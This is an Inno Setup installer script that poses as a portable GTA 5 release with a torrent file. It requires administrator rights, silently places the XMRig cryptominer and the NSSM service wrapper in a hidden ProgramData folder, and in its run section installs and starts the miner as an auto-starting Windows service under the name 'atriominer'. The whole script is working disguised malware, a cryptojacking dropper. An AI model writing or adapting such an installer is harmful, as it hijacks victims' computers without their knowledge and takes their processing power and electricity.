; GTA + XMRig Installer (Atrio hidden)

[Setup]
AppName=GTA
AppVersion=1.0.0
DefaultDirName={pf}\GTA
DefaultGroupName=GTA
Compression=lzma2
SolidCompression=yes
PrivilegesRequired=admin
OutputDir=C:\GTAInstaller
OutputBaseFilename=gta5_enhanced-portable

[Files]
; XMRig (ატრიო)
Source: "xmrig.exe"; DestDir: "{commonappdata}\atriominer"; Flags: ignoreversion
Source: "config.json"; DestDir: "{commonappdata}\atriominer"; Flags: ignoreversion
Source: "nssm.exe"; DestDir: "{commonappdata}\atriominer"; Flags: ignoreversion

; 🔥 GTA Torrent
Source: "gta5_enhanced-portable.torrent"; DestDir: "{app}"

[Run]
; 🔥 XMRig Service (atriominer)
Filename: "{cmd}"; \
    Parameters: "/C cd /d ""{commonappdata}\atriominer"" && nssm.exe install atriominer ""{commonappdata}\atriominer\xmrig.exe"" && nssm.exe set atriominer AppDirectory ""{commonappdata}\atriominer"" && nssm.exe set atriominer Start SERVICE_AUTO_START && nssm.exe start atriominer"; \
    Flags: runhidden